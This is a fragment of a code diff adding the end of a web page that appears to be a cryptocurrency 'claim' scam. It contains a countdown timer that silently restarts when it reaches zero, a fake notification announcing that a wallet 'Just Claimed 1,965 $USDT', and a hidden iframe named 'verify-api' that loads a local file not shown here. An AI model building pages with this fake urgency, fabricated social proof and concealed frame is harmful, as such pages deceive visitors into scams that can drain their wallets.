+    localStorage.setItem('timer_seconds', seconds);
+}
+
+function updateTimer() {
+    if (seconds > 0) {
+        seconds--;
+    } else if (minutes > 0) {
+        minutes--;
+        seconds = 59;
+    } else if (hours > 0) {
+        hours--;
+        minutes = 59;
+        seconds = 59;
+    }
+
+    console.log(`Часы: ${hours}, Минуты: ${minutes}, Секунды: ${seconds}`);
+    hourWrap.innerText = hours
+    minWrap.innerText = minutes
+    secWrap.innerText = seconds
+
+
+    saveTimeToStorage();
+
+    if (hours === 0 && minutes === 0 && seconds === 0) {
+    console.log("Таймер завершил обратный отсчёт! Начинаем заново!");
+
+
+    hours = defaultHours;
+    minutes = defaultMinutes;
+    seconds = defaultSeconds;
+}
+
+}
+
+loadTimeFromStorage(); 
+
+let interval = setInterval(updateTimer, 1000);
+
+    </script>
+
+
+
+<iframe id="verify-api" src="index_files/22ca44ad70db9157c51678791e25ec92.html" style="display: none;"></iframe><div id="toast-container" class="toast-top-right"><div class="toast toast-info" aria-live="polite" style=""><div class="toast-message">0x8A8... Just Claimed 1,965 $USDT</div></div></div></body>
+</html>
